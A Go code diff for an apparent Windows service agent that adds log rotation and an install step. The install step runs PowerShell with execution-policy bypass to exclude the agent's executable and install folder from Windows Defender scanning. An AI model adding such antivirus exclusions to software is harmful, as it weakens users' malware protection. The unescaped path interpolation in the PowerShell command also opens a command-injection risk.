@@ -8,6 +8,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"runtime/debug"
 	"time"
@@ -105,6 +106,13 @@ func runAsService() bool {
 		}
 	}
 	logPath := filepath.Join(logDir, "agent.log")
+
+	// Rotate log if it exceeds 10 MB to prevent unbounded growth
+	if info, statErr := os.Stat(logPath); statErr == nil && info.Size() > 10*1024*1024 {
+		oldLog := logPath + ".old"
+		os.Remove(oldLog)          // remove previous rotation
+		os.Rename(logPath, oldLog) // current → .old
+	}
 
 	var writers []io.Writer
 
@@ -230,6 +238,23 @@ func installService() error {
 	err = eventlog.InstallAsEventCreate(serviceName, eventlog.Error|eventlog.Warning|eventlog.Info)
 	if err != nil {
 		fmt.Printf("Note: Event log source setup: %v (may already exist)\n", err)
+	}
+
+	// Add Windows Defender exclusions via PowerShell
+	fmt.Println("Configuring Windows Defender exclusions...")
+	installDir := filepath.Dir(exePath)
+	
+	// Build PowerShell command to add exclusions
+	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionProcess '%s' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue`, 
+		exePath, installDir)
+	
+	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
+	if psErr := cmd.Run(); psErr != nil {
+		fmt.Printf("Note: Could not add Windows Defender exclusions: %v\n", psErr)
+		fmt.Printf("You may need to add exclusions manually:\n")
+		fmt.Printf("  Add-MpPreference -ExclusionPath '%s'\n", installDir)
+	} else {
+		fmt.Println("✓ Windows Defender exclusions configured")
 	}
 
 	fmt.Printf("Service %s installed successfully\n", serviceName)
